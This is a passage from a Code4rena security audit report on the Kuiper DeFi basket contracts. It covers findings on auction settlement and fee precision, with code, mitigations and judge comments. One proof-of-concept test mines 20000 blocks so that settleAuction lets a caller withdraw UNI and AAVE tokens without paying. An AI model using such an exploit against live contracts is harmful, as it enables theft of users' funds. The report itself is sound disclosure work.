class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auctionAddr</span><span class=\"mtk1\"> = </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auction</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">auction</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">AuctionImpl</span><span class=\"mtk1\">.</span><span class=\"mtk11\">attach</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionAddr</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">ethers</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBlockNumber</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// increase the block number for `bondBlock - auctionStart` to be 20000.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// When that&#39;s the case, the result of `newRatio` in `settleAuction()` </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// is `0`. And that means `tokensNeeded` is 0. Which means,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// we can take out all the tokens we want using the `outputTokens` array</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// without having to worry about basket&#39;s balance at the end.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The math changes depending on the settings of the factory contract or the</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Basket contract. But, the gist is that you try to get newRatio to be 0.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// The only values you can control as a attacker is the bondBlock after the auction</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// was started.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">for</span><span class=\"mtk1\"> (</span><span class=\"mtk4\">let</span><span class=\"mtk1\"> </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\"> &lt; </span><span class=\"mtk7\">20000</span><span class=\"mtk1\">; </span><span class=\"mtk12\">i</span><span class=\"mtk1\">++) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">          </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">hre</span><span class=\"mtk1\">.</span><span class=\"mtk12\">network</span><span class=\"mtk1\">.</span><span class=\"mtk12\">provider</span><span class=\"mtk1\">.</span><span class=\"mtk11\">send</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;evm_mine&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">approve</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&#39;5000000000000000&#39;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bondForRebalance</span><span class=\"mtk1\">()).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">await</span><span class=\"mtk1\"> </span><span class=\"mtk11\">expect</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auction</span><span class=\"mtk1\">.</span><span class=\"mtk11\">settleAuction</span><span class=\"mtk1\">([], [], [], [</span><span class=\"mtk12\">UNI</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">, </span><span class=\"mtk12\">AAVE</span><span class=\"mtk1\">.</span><span class=\"mtk12\">address</span><span class=\"mtk1\">], [</span><span class=\"mtk8\">&quot;200720000000000000&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;200120000000000000&quot;</span><span class=\"mtk1\">])).</span><span class=\"mtk12\">to</span><span class=\"mtk1\">.</span><span class=\"mtk12\">be</span><span class=\"mtk1\">.</span><span class=\"mtk12\">ok</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      });</span></span></span></code></pre>\n<p>Again, this test uses the base values. The math changes when the settings change. But, it should always be possible to trigger this attack. The gap between auction start and bonding just changes.</p>\n<h3 id=\"recommended-mitigation-steps-4\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-4\" aria-label=\"recommended mitigation steps 4 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<ul>\n<li>Verify that <code>newRatio != 0</code></li>\n</ul>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74#issuecomment-1048137500\">frank-beard (Kuiper) confirmed and commented</a>:</strong></p>\n<blockquote>\n<p>This is the reasoning for the minIbRatio value that the publisher sets when rebalancing weights. However we do need a check to make sure that <code>minIbRatio</code> is above 0.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/74#issuecomment-1079813752\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>I don’t think this deserves a <code>high</code> severity rating. There are a number of assumptions made:</p>\n<ul>\n<li><code>minIbRatio</code> has not been set to an expected value.</li>\n<li>The bonded user must be able to wait a certain number of blocks, likely exceeding the maximum amount of time allowed to settle the auction. This is currently set to one day. However, I understand that there might be some time that passes before a user bonds tokens and when the auction started.</li>\n</ul>\n<p>Because this issue is not directly exploitable, I think this behaviour fits the criteria of a <code>medium</code> severity issue.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-07-auctionsolsettleauction-bonder-may-not-be-able-to-settle-a-bonded-auction-leading-to-loss-of-funds\" style=\"position:relative;\"><a href=\"#m-07-auctionsolsettleauction-bonder-may-not-be-able-to-settle-a-bonded-auction-leading-to-loss-of-funds\" aria-label=\"m 07 auctionsolsettleauction bonder may not be able to settle a bonded auction leading to loss of funds permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106\">[M-07] <code>Auction.sol#settleAuction()</code> Bonder may not be able to settle a bonded auction, leading to loss of funds</a></h2>\n<p><em>Submitted by WatchPug</em></p>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/205d3766044171e325df6a8bf2e79b37856eece1/contracts/contracts/Auction.sol#L97-L102\">Auction.sol#L97-L102</a></p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"7\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionMultiplier</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ibRatio</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bondBlock</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">auctionStart</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionDecrement</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">b</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingTokens</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minIbRatio</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPendingWeights</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minIbRatio</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p>In the current implementation, <code>newRatio</code> is calculated and compared with <code>minIbRatio</code> in <code>settleAuction()</code>.</p>\n<p>However, if <code>newRatio</code> is less than <code>minIbRatio</code>, <code>settleAuction()</code> will always fail and there is no way for the bonder to cancel and get a refund.</p>\n<h3 id=\"proof-of-concept-5\" style=\"position:relative;\"><a href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Given:</p>\n<ul>\n<li><code>bondPercentDiv</code> = 400</li>\n<li><code>basketToken.totalSupply</code> = 40,000</li>\n<li><code>factory.auctionMultiplier</code> = 2</li>\n<li><code>factory.auctionDecrement</code> = 10,000</li>\n<li><code>basket.ibRatio</code> = 1e18</li>\n<li>p<code>endingWeights.minIbRatio</code> = 1.9 * 1e18</li>\n<li>Alice called <code>bondForRebalance()</code> <code>2,000</code> blocks after the auction started, paid <code>100</code> basketToken for the bond;</li>\n<li>Alice tries to <code>settleAuction()</code>, it will always fail because <code>newRatio &#x3C; minIbRatio</code>;</li>\n<li>a = 2 * 1e18</li>\n<li>b = 0.2 * 1e18</li>\n<li>newRatio = 1.8 * 1e18;</li>\n<li>Bob calls <code>bondBurn()</code> one day after, <code>100</code> basketToken from Alice will been burned.</li>\n</ul>\n<h3 id=\"recommended-mitigation-steps-5\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-5\" aria-label=\"recommended mitigation steps 5 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Move the <code>minIbRatio</code> check to <code>bondForRebalance()</code>:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"8\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">bondForRebalance</span><span class=\"mtk1\">() </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">auctionOngoing</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(!</span><span class=\"mtk12\">hasBonded</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bondTimestamp</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">timestamp</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bondBlock</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">block</span><span class=\"mtk1\">.</span><span class=\"mtk12\">number</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionMultiplier</span><span class=\"mtk1\">() * </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ibRatio</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">b</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">bondBlock</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">auctionStart</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">auctionDecrement</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">a</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">b</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    (</span><span class=\"mtk12\">address</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingTokens</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">[] </span><span class=\"mtk12\">memory</span><span class=\"mtk1\"> </span><span class=\"mtk12\">pendingWeights</span><span class=\"mtk1\">, </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minIbRatio</span><span class=\"mtk1\">) = </span><span class=\"mtk12\">basket</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getPendingWeights</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">newRatio</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">minIbRatio</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">basketToken</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">IERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">basket</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">bondAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">basketToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">totalSupply</span><span class=\"mtk1\">() / </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">bondPercentDiv</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">basketToken</span><span class=\"mtk1\">.</span><span class=\"mtk11\">safeTransferFrom</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">bondAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">hasBonded</span><span class=\"mtk1\"> = </span><span class=\"mtk4\">true</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">auctionBonder</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">emit</span><span class=\"mtk1\"> </span><span class=\"mtk11\">Bonded</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">bondAmount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">}</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106\">frank-beard (Kuiper) confirmed</a></strong></p>\n<p><strong><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/106#issuecomment-1079817328\">0xleastwood (judge) decreased severity to Medium and commented</a>:</strong></p>\n<blockquote>\n<p>While this issue is correct and I think this is a safer way to handle the <code>require(newRatio >= minIbRatio)</code> check, there are a few assumptions that are made. For example, it is assumed that the user bonds their tokens without checking <code>minIbRatio</code> and a publisher is able to maliciously update <code>minIbRatio</code> which must first go through timelock. Based on this, I’m more inclined to downgrade this to <code>medium</code> severity as I think this more accurately reflects the threat model.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-08-lost-fees-due-to-precision-loss-in-fees-calculation\" style=\"position:relative;\"><a href=\"#m-08-lost-fees-due-to-precision-loss-in-fees-calculation\" aria-label=\"m 08 lost fees due to precision loss in fees calculation permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2021-12-defiprotocol-findings/issues/60\">[M-08] Lost fees due to precision loss in fees calculation</a></h2>\n<p><em>Submitted by kenzo, also found by 0v3rf10w</em></p>\n<p>In fees calculation, division is being used in the midst of the calculation, not at the end of it.\nThis leads to lost precision in fee amount (as solidity doesn’t save remainder of division).\nDivision should happen at the end to maintain precision.</p>\n<h3 id=\"impact-2\" style=\"position:relative;\"><a href=\"#impact-2\" aria-label=\"impact 2 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Impact</h3>\n<p>Lost fees.\nThe exact amount depends on the parameters set and being tested.\nAccording to a few tests I ran, it seems that in normal usage, 1% of fees are lost.\nIn some cases even 7.5% of fees.</p>\n<h3 id=\"proof-of-concept-6\" style=\"position:relative;\"><a href=\"#proof-of-concept-6\" aria-label=\"proof of concept 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>Division in the midst of a calculation:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">timeDiff</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">licenseFee</span><span class=\"mtk1\"> / </span><span class=\"mtk12\">ONE_YEAR</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">startSupply</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\"> / (</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">feePct</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk12\">publisher</span><span class=\"mtk1\">, </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> * (</span><span class=\"mtk12\">BASE</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerSplit</span><span class=\"mtk1\">()) / </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk11\">_mint</span><span class=\"mtk1\">(</span><span class=\"mtk11\">Ownable</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">factory</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">owner</span><span class=\"mtk1\">(), </span><span class=\"mtk12\">fee</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">factory</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ownerSplit</span><span class=\"mtk1\">() / </span><span class=\"mtk12\">BASE</span><span class=\"mtk1\">);</span></span></span></code></pre>\n<p><a href=\"https://github.com/code-423n4/2021-12-defiprotocol/blob/main/contracts/contracts/Basket.sol#L140:#L145\">Basket.sol#L140:#L145</a><br>\nIt’s a little hard to share a POC script as it involves changing the .sol file so I tested it manually. But after moving the division to the end using the mitigation below, I saw 1%-7% increases in fees minted. Usually 1%.</p>\n<h3 id=\"recommended-mitigation-steps-6\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-6\" aria-label=\"recommended mitigation steps 6 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 